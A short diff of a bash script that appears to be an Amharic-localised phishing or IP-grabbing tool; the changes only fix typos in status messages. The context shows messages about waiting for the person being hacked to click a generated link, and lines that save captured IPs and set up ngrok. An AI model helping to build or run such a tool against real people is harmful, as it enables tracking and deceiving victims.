@@ -65,7 +65,7 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] hack የምታረጉት ሰው እስኪነካው እየጠበኩ ነው\e[0m\e[1;77m ለማቆመሰ Ctrl + C ይፃፉ...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] hack የምታረጉት ሰው እስኪነካው እየጠበኩ ነው\e[0m\e[1;77m ለማቆም Ctrl + C ይፃፉ...\e[0m\n"
 while [ true ]; do
 
 
@@ -135,7 +135,7 @@ if [[ -e ngrok ]]; then
 echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "wget ያስጋል እሱን plg install wget በመፃፍ ያውርዱ"; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "wget ያስጋል እሱን pkg install wget በመፃፍ ያውርዱ"; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] ሊንኩን እያዘጋጀው ነው በትእግስት ይጠብቁ ...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
